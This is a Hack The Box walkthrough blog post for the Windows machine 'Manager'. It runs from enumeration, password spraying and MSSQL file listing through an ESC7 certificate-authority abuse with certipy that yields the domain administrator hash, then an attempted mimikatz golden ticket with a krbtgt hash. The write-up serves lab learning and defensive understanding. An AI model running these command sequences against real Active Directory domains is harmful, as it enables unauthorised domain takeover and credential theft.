+++
tags = ["Box", "HTB", "Manager", "Windows", "LDAP", "kerberos", "SMB", "MSSQL", "Certificate", "CA", "ESC7"]
draft = false
title = "Manager HTB Walkthrough"
date = 2024-09-22
author = "bloodstiller"
toc = true
bold = true
next = true
+++

## Hack The Box Manager Walkthrough/Writeup: {#name-of-box-manager}

-   <https://app.hackthebox.com/machines/Manager>

## How I use variables &amp; wordlists: {#how-i-use-variables-and-wordlists}

-   **Variables**:
    -   In my commands you are going to see me use `$box`, `$user`, `$hash`, `$domain`, `$pass` often.
        -   I find the easiest way to eliminate type-os &amp; to streamline my process it is easier to store important information in variables &amp; aliases.
            -   `$box` = The IP of the box
            -   `$pass` = Passwords I have access to.
            -   `$user` = current user I am enumerating with.
                -   Depending on where I am in the process this can change if I move laterally.
            -   `$domain` = the domain name e.g. `sugarape.local` or `contoso.local`
        -   Why am I telling you this? People of all different levels read these writeups/walktrhoughs and I want to make it as easy as possible for people to follow along and take in valuable information.
-   **Wordlists**:
    -   I have symlinks all setup so I can get to my passwords from `~/Wordlists` so if you see me using that path that's why. If you are on Kali and following on, you will need to go to `/usr/share/wordlists`
        -   I also use these additional wordlists:
            -   [Statistically-likely-usernames](https://github.com/insidetrust/statistically-likely-usernames)
            -   [SecLists](https://github.com/danielmiessler/SecLists)
            -   [Auto_Wordlists](https://github.com/carlospolop/Auto_Wordlists)

## 1. Enumeration: {#1-dot-enumeration}


### NMAP: {#nmap}

-   **Basic Scan**:
    -   `nmap $box -Pn -oA basicScan`
        ```shell
          Host is up (0.040s latency).
          Not shown: 987 filtered tcp ports (no-response)
          PORT     STATE SERVICE
          53/tcp   open  domain
          80/tcp   open  http
          88/tcp   open  kerberos-sec
          135/tcp  open  msrpc
          139/tcp  open  netbios-ssn
          389/tcp  open  ldap
          445/tcp  open  microsoft-ds
          464/tcp  open  kpasswd5
          593/tcp  open  http-rpc-epmap
          636/tcp  open  ldapssl
          1433/tcp open  ms-sql-s
          3268/tcp open  globalcatLDAP
          3269/tcp open  globalcatLDAPssl
        ```
-   This scan already gives us a lot to go off of.
    -   We can see that numerous services are running:
        -   What is telling is that port `53` is running, which means this host is running it's own DNS service, which would indicate that it's running as a server or even a DC. We can also see that it's running `88` kerberos &amp; `389,3268,3269` ldap/ldapssl which again indicates it's a server/DC. We also have `1433` MSSQL running. Lots of interesting things.

-   **In depth scan**:
    -   `sudo nmap -p- -sV -sC -O -Pn --disable-arp-ping $box -oA FullTCP`
    -   {{< figure src="/ox-hugo/2024-09-20-201131_.png" >}}
    -   We can see the host is called `DC01` which lets us know this is a high-value target as it's a domain controller.


### Web `80`: {#web-80}

-   Looking at the website, it appears to be running a content writing service:
    -   {{< figure src="/ox-hugo/2024-09-20-201811_.png" >}}

-   Wappalyzer doesn't give any additional information regarding the underlying software stack being used.
    -   {{< figure src="/ox-hugo/2024-09-20-200932_.png" >}}

-   I check the "contact" page for injection as it has a submission form:
    -   {{< figure src="/ox-hugo/2024-09-20-202029_.png" >}}
    -   However it does not appear to be injectable:
        -   {{< figure src="/ox-hugo/2024-09-20-202250_.png" >}}

-   I perform some dirbusting with little to no results:
    -   {{< figure src="/ox-hugo/2024-09-20-205837_.png" >}}

<!--listend-->

-   Tip, as soon as you start investigating any websites, ALWAYS proxy them through burp straight away. This way as you are working your way around the site looking for injection points and seeing how the site works and reacts to input you have a log already running.


### SMB `445`: {#smb-445}

-   SMB appears to allow us to login via the guest account:
    -   {{< figure src="/ox-hugo/2024-09-20-202838_.png" >}}

-   There are a number of shares running, but we only have read access to the `IPC$` share:
    -   {{< figure src="/ox-hugo/2024-09-20-202937_.png" >}}

-   As expected there is nothing in it:
    -   {{< figure src="/ox-hugo/2024-09-20-203129_.png" >}}


#### Over view of `IPC$` Share: {#over-view-of-ipc-share}

-   **Quick overview if you are unfamiliar with the `IPC$` share**:
    -   The `IPC$` share (`Inter-Process Communication`) is a special administrative share in Windows which allows communication with programs via Named Pipes:
        -   It's mainly used for inter-process communication between hosts over a network.
        -   It also enables remote administration of a system, allowing file and print sharing.
        -   It's a default share on windows systems.
        -   Requires credentials for access, typically used in conjunction with administrative or user rights.
            -   But as you can see `Guest` creds can also work in some instances.
        -   It is possible to use `IPC$` for enumeration (e.g., enumerating users, shares, groups or services).


### LDAP `389`: {#ldap-389}

-   **Using LDAP anonymous bind to enumerate further**:
    -   If you are unsure of what anonymous bind does. It enables us to query for domain information anonymously, e.g. without passing credentials.
        -   We can actually retrieve a significant amount of information via anonymous bind such as:
            -   A list of all users
            -   A list of all groups
            -   A list of all computers.
            -   User account attributes.
            -   The domain password policy.
            -   Enumerate users who are susceptible to AS-REPRoasting.
            -   Passwords stored in the description fields
        -   The added benefit of using ldap to perform these queries is that these are most likely not going to trigger any sort of AV etc as ldap is how AD communicates.
-   I actually have a handy script to check if anonymous bind is enabled &amp; if it is to dump a large amount of information. You can find it here
    -   <https://github.com/bloodstiller/ldapchecker>

-   It turns out the anonymous bind is enabled and we get the below information. I have removed the majority of the information as it is not relevant, however there are some keys bits of information we can use moving forward.
    1.  <span class="underline">We have the naming context of the domain</span>:
        ```shell
        kali in ~/Desktop/WindowsTools 🐍 v3.11.9  4GiB/7GiB | 780kiB/1GiB with /usr/bin/zsh
        🕙 20:42:31 zsh ❯ python3 ldapchecker.py $box
        Attempting to connect to 10.129.188.216 with SSL...
        Connected successfully. Retrieving server information...
        DSA info (from DSE):
          Supported LDAP versions: 3, 2
          Naming contexts:
            DC=manager,DC=htb
            CN=Configuration,DC=manager,DC=htb
            CN=Schema,CN=Configuration,DC=manager,DC=htb
            DC=DomainDnsZones,DC=manager,DC=htb
            DC=ForestDnsZones,DC=manager,DC=htb
        ```

    2.  <span class="underline">We have the domain functionaility level</span>:
        ```shell
        Other:
          domainFunctionality:
            7
          forestFunctionality:
            7
          domainControllerFunctionality:
            7
          rootDomainNamingContext:
            DC=manager,DC=htb
          ldapServiceName:
            manager.htb:dc01$@MANAGER.HTB
        ```

        -   The functionality level determines the minimum version of Windows server that can be used for a DC.
            -   +Note+: That any host os can be used on **workstations**, however the functionality level determines what the minimum version for DC's and the forest.
            -   <https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/active-directory-functional-levels>
            -   Knowing the function level is useful as if want to target the DC's and servers, we can know by looking at the function level what the minimum level of OS would be.

            -   In this case we can see it is level 7 which means that this server has to be running Windows Server 2016 or newer.
            -   Here’s a list of functional level numbers and their corresponding Windows Server operating systems:

                | Functional Level Number | Corresponding OS            |
                |-------------------------|-----------------------------|
                | 0                       | Windows 2000                |
                | 1                       | Windows Server 2003 Interim |
                | 2                       | Windows Server 2003         |
                | 3                       | Windows Server 2008         |
                | 4                       | Windows Server 2008 R2      |
                | 5                       | Windows Server 2012         |
                | 6                       | Windows Server 2012 R2      |
                | 7                       | Windows Server 2016         |
                | 8                       | Windows Server 2019         |
                | 9                       | Windows Server 2022         |

                -   +Note+:
                    -   Each number corresponds to the minimum Windows Server version required for domain controllers in the domain or forest.
                    -   As the functional level increases, additional Active Directory features become available, but older versions of Windows Server may not be supported as domain controllers.

    3.  <span class="underline">We have the full server name</span>:
        -   Again we can see this has the CN as the base (mentioned previously.) 
            ```shell
             serverName:
                CN=DC01,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=manager,DC=htb
            ```

-   It's pretty amazing already what we have learned just by running some fairly simple ldap queries.
    -   We have the naming context.
    -   Domain name.


### DNS `53`: {#dns-53}

-   I run DNSenum on the host to find out if there are any interesting entries:
    -   `dnsenum -r --dnsserver $box --enum -p 0 -s 0 -f ~/Seclists/Discovery/DNS/subdomains-top1million-110000.txt manager.htb`
-   Unfortunately I get very little from this bar the standard DNS entries present on DC's by default:
-   {{< figure src="/ox-hugo/2024-09-20-210200_.png" >}}
    -   `domaindnszones.manager.htb`: Stores DNS records replicated across all domain controllers in the domain.
    -   `forestdnszones.manager.htb`: Stores DNS records replicated across all domain controllers in the forest.
    -   `gc._msdcs.manager.htb`: Used to locate Global Catalog servers for cross-domain queries and authentication.


### Kerberos `88`: {#kerberos-88}

-   **As kerberos is open we can also enumerate users, groups and some other information**:

-   I spin up [Kerbrute](https://github.com/ropnop/kerbrute) and pass it a username list from [seclists](https://github.com/danielmiessler/SecLists):
    -   `kerbrute userenum -d manager.htb --dc $box ~/Wordlists/seclists/Usernames/xato-net-10-million-usernames.txt`

    -   {{< figure src="/ox-hugo/2024-09-21-074049_.png" >}}

-   I use the [impacket-lookupsid](https://github.com/fortra/impacket/blob/master/examples/lookupsid.py) module to further enumerate groups, users &amp; machine accounts:
    -   `impacket-lookupsid manager.htb/guest@dc01.manager.htb -domain-sids`
    -   {{< figure src="/ox-hugo/2024-09-21-074255_.png" >}}
        -   **We find some interesting things here**:
            1.  Standard User accounts built into any DC.
            2.  Machine account `DC01$`.
                -   All machine accounts are followed by the `$` symbol
            3.  Groups.
            4.  Non default user accounts.
                -   You may also notice that the user `ChinHae` did not show up in `kerbrute` this is due to us using brute-forcing to enumerate users in `kerbrute` where-as with this module we are actively querying the DC for this information.


### Making a list&#x2026;.checking it once?: {#making-a-list-and-x2026-dot-checking-it-once}

-   There does not seem to be anything obvious and low-hanging that is exploitable. So I am going to try some password spraying, using the users name as their password.
    -   If this does not work I will then crawl the site using [CeWL](https://github.com/digininja/CeWL) to generate a custom password list.
-   I create a password list from their usernames, to avoid complexity I have made all passwords lower-case.
    -   `netexec smb $box -u Users.txt -p Passwords.txt --no-bruteforce`
        -   As I currently do not know the password policy (I tried enumerating it but the `guest` account would not allow me to, nor would LDAP) I used the `--no-bruteforce` flag which means it will not try all combinations.
    -   **I get a hit!**
        -   {{< figure src="/ox-hugo/2024-09-21-143127_.png" >}}


## 2. Foothold: {#2-dot-foothold}


### Credentialed SMB Enumeration: {#credentialed-smb-enumeration}

I check if we have access to more smb shares with the creds &amp; we do:

-   {{< figure src="/ox-hugo/2024-09-21-143649_.png" >}}
-   Often the SYSVOL share will be used to hold scripts on a DC so this is a good target to go after.

-   **SMBClient**:
    -   I check both shares and we cannot list the contents of them:
        -   `smbclient -U '$user'  "\\\\$box\\SYSVOL"`
        -   `smbclient -U '$user'  "\\\\$box\\NETLOGON"`
        -   {{< figure src="/ox-hugo/2024-09-21-143934_.png" >}}
            -   See future bloodstiller note below for why this did not work, it was my syntax!!!

-   **SMBMAP**:
    -   To ensure I am not getting false positives from my tools I also try SMBMAP:
        -   `smbmap -u '$user' -p '$user' -H $box -r`
        -   {{< figure src="/ox-hugo/2024-09-21-144057_.png" >}}
        -   **Future Bloodstiller here**:
            -   This didn't work as I had enclosed my alias' in quotations it should have been `$user` not `$user` and it would have listed the contents of the shares. However I still did not have access to read items within.

-   **Netexec Spidering**:
    -   I try one more tool, netexec and use it to spider,
        -   `netexec smb $box -u $user -p $user -M spider_plus -o EXCLUDE_DIR=IPC$`
        -   We can see from the results that there are files &amp; shares available. I have excluded the `IPC$` share from this process as although privesc is possible using this share it's most probably unlikely due to the complexity of the attack &amp; this is a medium rated box. Which means there are files here it just may be that our current user does not have access to them.
        -   {{< figure src="/ox-hugo/2024-09-21-144457_.png" >}}


### Credentials MSSQL Enumeration: {#credentials-mssql-enumeration}

-   **I check if our credentials are valid for the MSSQL service running &amp; they appear to be**:
    -   {{< figure src="/ox-hugo/2024-09-21-150252_.png" >}}

-   **I connect using** `impacket-mssqlclient`:
    -   `sudo impacket-mssqlclient manager.htb/$user:$user@$box -windows-auth`
    -   {{< figure src="/ox-hugo/2024-09-21-151242_.png" >}}

-   I go for the easy win of trying to enable `xp_cmdshell` so we can run commands on the underlying OS but alas we do not have required perms:
    -   {{< figure src="/ox-hugo/2024-09-21-151736_.png" >}}

-   I also try running `xp_dirtree` to see if I can read files on the underlying OS
    -   `EXEC xp_dirtree 'C:\', 1, 1;`
        -   **We get a hit!**
            -   {{< figure src="/ox-hugo/2024-09-21-154502_.png" >}}
            -   This means we can read files &amp; folders on the underlying OS &amp; there are some interesting folders here already:
                -   `inetpub` (webserver)
                -   `Recovery` (potentially backups)
                -   `SQL2019` (it's in the name&#x2026;.)
                -   `Users` (&#x2026;.really?)

    -   **What is xp_dirtree?**
        -   `xp_dirtree` is a built-in SQL Server stored procedure that lets us list the contents of a directory—whether that’s subfolders, files, or both—without leaving the comfort of SQL. We tell it which folder to start with, how deep to go, and whether we want to see files in addition to folders.
            -   **Breaking down the command**:
                ```sql
                      EXEC xp_dirtree 'C:\', 1, 1;
                ```

                -   `C:`: This is the starting point—the directory we want to look into. In this case, we’re starting at the root of the C: drive.
                -   `1` (depth): This tells `xp_dirtree` to only look in the top-level folder, without diving into subdirectories. We can increase this number if we want to see deeper levels. E.G. `2` etc.
                -   `1` (file flag): This tells SQL Server to include both files and directories in the result. If you set this to 0, it will only list directories.


#### Finding a website backup: {#finding-a-website-backup}

-   I find a website backup in `C:\inetpub\wwwroot`
    -   {{< figure src="/ox-hugo/2024-09-21-155652_.png" >}}

-   As this backup is in the actual webroot itself we should be able to retrieve it via `wget`
    -   I download it:
    -   {{< figure src="/ox-hugo/2024-09-21-161131_.png" >}}


### Finding Hard-coded Credentials: {#finding-hard-coded-credentials}

-   I expand the zip file and immediatley see a file called `.old-conf.xml`:
    -   {{< figure src="/ox-hugo/2024-09-21-161238_.png" >}}

-   I find hardcoded creds for the user `Raven` in the file:
    -   {{< figure src="/ox-hugo/2024-09-21-161350_.png" >}}

-   I verify these work with netexec:
    -   `netexec smb $box -u $user -p $pass --shares`
    -   {{< figure src="/ox-hugo/2024-09-21-161705_.png" >}}
    -   Again we see that Raven has access to the same shares as the operator user.


### Getting access to the system as Raven: {#getting-access-to-the-system-as-raven}

-   I access the host using evil-winrm as Raven:
    -   {{< figure src="/ox-hugo/2024-09-21-163210_.png" >}}

-   User flag:
    -   {{< figure src="/ox-hugo/2024-09-21-163346_.png" >}}


## 3. Privilege Escalation: {#3-dot-privilege-escalation}


### Privesc Enumeration: {#privesc-enumeration}

-   I run `WinPEAS` and don't get anything too interesting.
-   I upload `SharpHound.exe` via evil-winrm and run a collection:
    -   {{< figure src="/ox-hugo/2024-09-21-185534_.png" >}}

-   Looking at our owned users, we can see that `Raven` has the `Enroll` edge/connection to the certificate authority `MANAGER-DC01-CA@MANAGER.HTB`:

-   **Enroll Edge Abuse**:
    -   In bloodhound it does not show us a specific attack path we can take:
        -   {{< figure src="/ox-hugo/2024-09-21-190109_.png" >}}
    -   However looking at the bloodhound knowledge base for enroll it tells us the following:

        > The Enroll permission grants enrollment rights on the certificate template.
        >
        > The following additional requirements must be met for a principal to be able to enroll a certificate:
        >
        > 1.  The certificate template is published on an enterprise CA
        > 2.  The principal has Enroll permission on the enterprise CA
        > 3.  The principal meets the issuance requirements and the requirements for subject name and subject alternative name defined by the template
    -   It also links us to the article [Certified_Pre-Owned](https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf)
    -   So from what I can tell this is abuse of the CA as a means to privesc.


### CA Abuse to Privesc: {#ca-abuse-to-privesc}

-   I use [Certipy](https://github.com/ly4k/Certipy) to enumerate for vulnerabilities
    -   `certipy-ad find -vulnerable -u $user@manager.htb -p $pass -dc-ip $box`
-   {{< figure src="/ox-hugo/2024-09-21-190643_.png" >}}
    -   I did import it into bloodhound, but I'll be honest, I wasn't sure what extra it gave me &amp; as I am running bloodhound in docker I did not add the extra queries.

-   Looking at the output I can see that Raven has dangerous permissions:
    -   {{< figure src="/ox-hugo/2024-09-21-192201_.png" >}}
        -   We can see that the attack path we can take is `ESC7`

            > ESC7 is when a user has the Manage CA or Manage Certificates access right on a CA. There are no public techniques that can abuse the Manage Certificates access right for domain privilege escalation, but it can be used it to issue or deny pending certificate requests
        -   This means that she has the `ManageCA` rights over the `CA` and but utilzing the `ESC7` scenario we can elevate our privileges to `Domain Admin`. We just need to follow the steps as outlined on <https://github.com/ly4k/Certipy?tab=readme-ov-file#esc7>:

-   **ESC7 Attack Process Overview (simplified)**:
    1.  **Permissions Setup/Make ourselves an** `officer` **on the** `CA`:
        -   As we have the `ManageCA` permission on the Windows domain Certificate Authority (`CA`). We can also grant ourselves the `Manage Certificates permission` (using the `ManageCA` permission).
        -   We can add ourselves as an `officer` with `Manage Certificates permission`.
        -   This permission gives us control to handle certificate requests and issue certificates, even failed ones (that last one is important!)

    2.  **Vulnerable Certificate Template**:
        -   The `SubCA` certificate template is vulnerable to exploitation.
        -   If it is disabled, we will use our new permissions as an `officer` to enable it on the `CA`

    3.  **Making the Certificate Request**:
        -   We request a certificate using the `SubCA` template for an admin account (e.g., `administrator@manager.htb`).
        -   Our request will be denied, but we save the private key and note down the request ID.

    4.  **Re-Issuing the Denied Request**:
        -   Since we have Manage Certificates permission, we can issue the previously denied certificate request using the request ID.

    5.  **Retrieving the Certificate**:
        -   Finally, we retrieve the issued certificate and private key for the highly privileged account e.g. domain admin/admin.

    6.  **Result**:
        -   We now have a valid certificate for a privileged account, allowing us to impersonate that user and escalate our access.


#### Step 1 Add Raven as an Officer, to manage &amp; issue certs: {#step-1-add-raven-as-an-officer-to-manage-and-issue-certs}

-   `certipy-ad ca -u $user@manager.htb -p $pass -dc-ip $box -ca manager-dc01-ca -add-officer raven -debug`
    -   {{< figure src="/ox-hugo/2024-09-21-193249_.png" >}}


#### Step 2 Enable `SubCA` template: {#step-2-enable-subca-template}

-   **Enable SubCA Template**:
    -   `certipy-ad ca -u $user@manager.htb -p $pass -dc-ip $box -ca manager-dc01-ca -enable-template SubCA -debug`
        -   {{< figure src="/ox-hugo/2024-09-21-193513_.png" >}}
        -   The reason we do this is because:

            > The SubCA certificate template is vulnerable to ESC1, but only administrators can enroll in the template. Thus, a user can request to enroll in the SubCA - which will be denied - but then issued by the manager afterwards.

            -   I see this says `ESC1` however we are using this cert as only admins can enroll using this cert and we want to privesc to admin.

-   **Verify the template has been enabled**:
    -   `certipy-ad ca -u $user@manager.htb -p $pass -dc-ip $box -ca manager-dc01-ca -list-templates -debug`
        -   {{< figure src="/ox-hugo/2024-09-21-193614_.png" >}}


#### Step 3 Request a certificate on behalf of the administrator: {#step-3-request-a-certificate-on-behalf-of-the-administrator}

-   **We request a certificate for the administrator, as expected it is denied**:
    -   `certipy-ad req -u $user@manager.htb -p $pass -dc-ip $box -ca manager-dc01-ca -template SubCA -upn administrator@manager.htb -debug`
        -   {{< figure src="/ox-hugo/2024-09-21-195727_.png" >}}
        -   We opt to save it anyway &amp; take a note of the number listed `23`
        -   This is the most important part of this whole process. We are setting the `UPN` (User Principal Name) to be `administrator@manager.htb` this means we are requesting this ticket on behalf of the `administrator` user.


#### Step 4 Re-issue our failed cert: {#step-4-re-issue-our-failed-cert}

-   **We re-issue our failed cert**:
    -   `certipy-ad ca -u $user@manager.htb -p $pass -dc-ip $box -ca manager-dc01-ca -issue-request 23 -debug`
        -   {{< figure src="/ox-hugo/2024-09-21-195847_.png" >}}


#### Step 5 Retrieve the issued cert and download as `.pfx`: {#step-5-retrieve-the-issued-cert-and-download-as-dot-pfx}

-   **We request our re-issued cert and download it**:
    -   `certipy-ad req -u $user@manager.htb -p $pass -dc-ip $box -ca manager-dc01-ca -retrieve 23 -debug`
        -   {{< figure src="/ox-hugo/2024-09-21-200201_.png" >}}


#### Step 6 Retrieve the Admin Hash: {#step-6-retrieve-the-admin-hash}

-   **Sync your clock first**:
    -   For the love all that is HOLY do this before you progress any further!!
        -   Sync your Kali/attack host clock with the box. The reason is if you do not, kerberos will be unhappy and not let you progress. This is a security mechanism.
            -   If you see the below error this is most likely down to your attack host clock being too out of sync with the target.
                -   {{< figure src="/ox-hugo/2024-09-21-201233_.png" >}}

    -   **If you are on kali do the following**:
        -   `sudo apt install ntpdate`
        -   Ensure that you have the host in your `/etc/hosts` file &amp; then run: `sudo ntpdate -s manager.htb` this will sync your clocks.

-   **Retrieve Admin Hash!**:
    -   `certipy-ad auth -pfx administrator.pfx`
        -   {{< figure src="/ox-hugo/2024-09-21-201449_.png" >}}


### Attack Deep-Dive e.g. Exploiting UPNs in ESC7 Attacks: A Hacker's Guide: {#attack-deep-dive-e-dot-g-dot-exploiting-upns-in-esc7-attacks-a-hacker-s-guide}

-   **What's a UPN and Why Do We Care?**
    -   First things first: `UPN` stands for User Principal Name (UPN). They're commonly used when issuing certificates from a Microsoft Certificate Authority (CA) for user authentication. Here's why they're so important:
        1.  They represent identity in certificates, usually in the Subject Alternative Name (SAN) extension.
        2.  They link certificates to specific Active Directory accounts.
        3.  They enable certificate mapping for authentication.
        4.  They facilitate Single Sign-On (SSO) scenarios.
        5.  They're used in smart card logons.
        6.  Sometimes, they even correspond to email addresses.

-   **The ESC7 Attack: Our Ticket to Domain Admin**:
    The ESC7 attack path all revolves around a misconfigured certificate template.
    1.  We find a template that lets us specify our own Subject Alternative Name (SAN) when requesting a certificate. `SubCA`

    2.  We request a certificate and we specify a UPN of a high-privileged account (like a domain admin) in the certificate's SAN field.

    3.  The CA will issue us a certificate with our specified UPN, even though it doesn't match our actual identity.

    4.  Now we can authenticate as admin:

-   **From Certificate to Domain Domination**:

But wait, you might ask, "Bloodstiller, how do we actually use this certificate to own the domain?" Great question! Here's how we turn our shiny new cert into total control:

1.  We present our manipulated certificate to the target system (usually a domain controller).

2.  The system checks the cert: Is it valid? Not expired? Issued by a trusted CA?
    -   As we have power to issue certs, it's valid - check.
    -   We just issued it - check.
    -   As CA's be default trust certs issues by themselves - check!

3.  Here's where the magic happens: the DC/System extracts the `UPN` (which we set) from the `SAN` field of our certificate.

4.  It uses this `UPN` to find the corresponding user account in Active Directory. Remember, this is the admin account we specified, not our actual account!

5.  If everything looks good (and why wouldn't it?), the system hands us a Kerberos Ticket Granting Ticket (`TGT`) for that account.

6.  Boom! We now have a TGT for a high-privileged account. We can use this ticket to access resources and wreak havoc with admin privileges.
    -   +Note+: Certipy extracts this the admin hash from TGT and presents us with it as well as saving the TGT as a `.cacche` file so we can then perform PTT attacks from the comfort of our attack box.

<!--listend-->

-   **Why This Attack is a Hacker's Dream**:
    -   It bypasses multi-factor authentication (MFA)!!!
    -   No account lockouts to worry about.
    -   It's stealthy - often not logged as clearly as failed password attempts.
    -   All our actions look like they're coming from the real admin account.


## 4. Ownership: {#4-dot-ownership}

1.  -   **I login as the admin using their hash**:
        -   {{< figure src="/ox-hugo/2024-09-21-201828_.png" >}}
        -   {{< figure src="/ox-hugo/2024-09-21-201955_.png" >}}


## 5. Persistence: {#5-dot-persistence}

-   My original plan was to craft a golden ticket however for whatever reason it would not work, I tried numerous ways with mimikatz, ruebeus etc but it would always give me the error:
    -   `[-] Kerberos SessionError: KDC_ERR_TGT_REVOKED(TGT has been revoked)` it may just be that this host is set to detect Golden Ticket abuse. I did consider doing a diamond exploit, however I need to look more into the process.

-   I have persistence via the hashes of the users below:
    -   I dump the NTDS db so I can retrieve the `krbtgt` account hash
        -   {{< figure src="/ox-hugo/2024-09-21-202305_.png" >}}


### Process of failed Golden Ticket Attack: {#process-of-failed-golden-ticket-attack}

-   In-case anyone can see any glaring issues. If you can hit me up on `bloodstiller at proton.me` &amp; tell me why I am dumb please.
    1.  Upload `nc.exe` &amp; `mimikatz` via existing administrator evil-winrm session
    2.  Sync host clock with target clock (this is important!)
    3.  Start reverse shell:
        -   {{< figure src="/ox-hugo/2024-09-22-093019_.png" >}}
            -   If anyone is wondering why I am creating a reverse shell when I have an `evil-winrm` shell, it's because mimikatz does not play nice with `evil-winrm`.
    4.  Request golden ticket
        -   `kerberos::golden /domain:manager.htb /user:administrator /sid:S-1-5-21-4078382237-1492182817-2568127209-500 /krbtgt:b5edce70e6c1efa075f14bcf5231f79a`
        -   {{< figure src="/ox-hugo/2024-09-22-093043_.png" >}}
    5.  Download ticket.kirbi
        -   {{< figure src="/ox-hugo/2024-09-22-093105_.png" >}}
    6.  Convert `ticket.kirbi` to `.cacche` for use on linux.
        -   {{< figure src="/ox-hugo/2024-09-22-093121_.png" >}}
    7.  Import `.ccache` file into `KRB5CCNAME` variable
        -   {{< figure src="/ox-hugo/2024-09-22-093134_.png" >}}
    8.  Run klist to ensure ticket is imported variable.
        -   {{< figure src="/ox-hugo/2024-09-22-093207_.png" >}}
            -   As we can see this ticket is valid for 10 years:
                -   I also tried appending the specific user SID for admin of `500` &amp; also using a lower-case `administrator`.
    9.  Run `impacket-psexec`:
        -   {{< figure src="/ox-hugo/2024-09-22-093219_.png" >}}


## Lessons Learned: {#lessons-learned}


### What did I learn? {#what-did-i-learn}

1.  I learned alot about certificate attacks, I had done very little on them previously so this was nice to get done.
2.  I learned about golden ticket attacks being thwarted&#x2026;&#x2026;


### What silly mistakes did I make? {#what-silly-mistakes-did-i-make}

1.  Enclosing my user &amp; password vars in quotations marks rendering them USELESS! We live and learn
2.  The standard not updating `/etc/hosts` when doing LDAP queries etc.
3.  Oh here is a fun one, I spent a good amount of time trying to exfil the website backup before realizing it was in-fact in the webroot and I could just `wget` it.


## Sign off: {#sign-off}

Remember, folks as always: with great power comes great pwnage. Use this knowledge wisely, and always stay on the right side of the law!

Until next time, hack the planet!

&#x2013; Bloodstiller

&#x2013; Get in touch bloodstiller at proton dot me
